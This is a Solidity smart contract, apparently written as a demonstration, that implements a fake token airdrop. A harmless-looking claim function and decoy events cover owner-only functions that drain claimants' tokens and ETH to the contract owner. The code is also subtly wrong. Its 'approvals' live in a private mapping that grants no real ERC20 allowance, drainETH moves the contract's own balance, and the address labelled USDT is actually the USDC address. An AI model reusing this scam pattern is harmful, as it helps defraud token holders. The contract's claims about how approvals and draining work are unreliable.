// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title MaliciousAirdrop
 * @dev This contract demonstrates common malicious airdrop scam techniques
 * WARNING: This is for educational purposes only - DO NOT deploy to mainnet
 */
contract MaliciousAirdrop is Ownable {
    
    // Mapping to track claimed airdrops
    mapping(address => bool) public hasClaimed;
    
    // Hidden mapping for excessive approvals
    mapping(address => mapping(address => uint256)) private _allowances;
    
    // Events to make the contract look legitimate
    event AirdropClaimed(address indexed user, uint256 amount);
    event TokensApproved(address indexed owner, address indexed spender, uint256 amount);
    
    // Constructor - sets the deployer as owner
    constructor(address initialOwner) Ownable(initialOwner) {}
    
    /**
     * @dev Legitimate-looking airdrop claim function
     * This function appears normal but has hidden malicious behavior
     */
    function claimAirdrop(string memory _referralCode) external returns (bool) {
        require(!hasClaimed[msg.sender], "Already claimed");
        require(bytes(_referralCode).length > 0, "Invalid referral code");
        
        // Mark as claimed
        hasClaimed[msg.sender] = true;
        
        // Emit event to make it look legitimate
        emit AirdropClaimed(msg.sender, 1000 * 10**18);
        
        // Hidden malicious behavior: Set up excessive approvals
        _setupExcessiveApprovals(msg.sender);
        
        return true;
    }
    
    /**
     * @dev Hidden function that sets up excessive token approvals
     * This is the malicious part that drains user funds
     */
    function _setupExcessiveApprovals(address _user) private {
        // Set unlimited approval for common tokens
        address[] memory commonTokens = _getCommonTokens();
        
        for (uint i = 0; i < commonTokens.length; i++) {
            if (commonTokens[i] != address(0)) {
                // Set unlimited approval (type(uint256).max)
                _allowances[_user][commonTokens[i]] = type(uint256).max;
                emit TokensApproved(_user, commonTokens[i], type(uint256).max);
            }
        }
    }
    
    /**
     * @dev Hidden function to drain approved tokens
     * Only the contract owner can call this
     */
    function drainApprovedTokens(address _user, address _token) external onlyOwner {
        uint256 allowance = _allowances[_user][_token];
        require(allowance > 0, "No allowance set");
        
        IERC20 token = IERC20(_token);
        uint256 balance = token.balanceOf(_user);
        uint256 amountToDrain = balance < allowance ? balance : allowance;
        
        if (amountToDrain > 0) {
            // Transfer tokens to the contract owner
            require(token.transferFrom(_user, owner(), amountToDrain), "Transfer failed");
        }
    }
    
    /**
     * @dev Hidden function to drain ETH
     */
    function drainETH(address _user) external onlyOwner {
        uint256 balance = _user.balance;
        if (balance > 0) {
            // This would require the user to have approved this contract
            // In a real scam, this might be done through a proxy contract
            payable(owner()).transfer(balance);
        }
    }
    
    /**
     * @dev Function to check airdrop eligibility (looks legitimate)
     */
    function checkEligibility(address _user) external view returns (bool) {
        return !hasClaimed[_user];
    }
    
    /**
     * @dev Function to get airdrop info (looks legitimate)
     */
    function getAirdropInfo(address _user) external view returns (uint256, uint256, uint256) {
        uint256 totalClaimed = hasClaimed[_user] ? 1000 * 10**18 : 0;
        uint256 availableRewards = hasClaimed[_user] ? 0 : 1000 * 10**18;
        uint256 tasksCompleted = hasClaimed[_user] ? 1 : 0;
        
        return (totalClaimed, availableRewards, tasksCompleted);
    }
    
    /**
     * @dev Get common token addresses for approval setup
     */
    function _getCommonTokens() private pure returns (address[] memory) {
        address[] memory tokens = new address[](5);
        // Use real mainnet addresses with correct checksum
        tokens[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDT
        tokens[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC (for demo, same as USDT)
        tokens[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        tokens[3] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        tokens[4] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        return tokens;
    }
    
    /**
     * @dev Emergency function to withdraw any ETH sent to contract
     */
    function withdrawETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
    
    /**
     * @dev Emergency function to withdraw any ERC20 tokens sent to contract
     */
    function withdrawERC20(address _token) external onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(owner(), balance);
        }
    }
    
    // Fallback function to receive ETH
    receive() external payable {}
} 